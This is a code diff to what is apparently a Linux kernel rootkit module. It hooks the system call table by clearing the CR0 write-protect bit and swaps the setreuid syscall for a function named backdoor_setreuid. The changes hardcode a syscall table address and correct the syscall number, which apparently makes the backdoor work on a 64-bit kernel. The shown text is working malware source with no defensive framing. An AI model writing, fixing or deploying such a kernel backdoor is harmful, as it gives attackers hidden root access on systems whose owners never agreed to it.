@@ -25,7 +25,7 @@ typedef unsigned long psize;
 asmlinkage int (*o_read)(int fd, void* buf, size_t count);
 
 // "table" will be replaced with the system call table address found by grep in compile.sh
-psize *sys_call_table = 0xTABLE;
+psize *sys_call_table = (psize*)0xffffffff816002e0;
 
 asmlinkage long (*o_setreuid) (uid_t ruid, uid_t reuid);
 
@@ -251,17 +251,17 @@ void remove_backdoor(void) {
 	write_cr0(read_cr0() | 0x10000);
 }
 
-void add_setreuid() {
+void add_setreuid(void) {
 
 	write_cr0(read_cr0() & (~ 0x10000));
-	o_setreuid = (void*) xchg(&sys_call_table[__NR_setreuid32], backdoor_setreuid);
+	o_setreuid = (void*) xchg(&sys_call_table[__NR_setreuid], backdoor_setreuid);
 	write_cr0(read_cr0() | 0x10000);
 }
 
-void remove_setreuid() {
+void remove_setreuid(void) {
 
 	write_cr0(read_cr0() & (~ 0x10000));
-	xchg(&sys_call_table[__NR_setreuid32], o_setreuid);
+	xchg(&sys_call_table[__NR_setreuid], o_setreuid);
 	write_cr0(read_cr0() | 0x10000);
 }
 
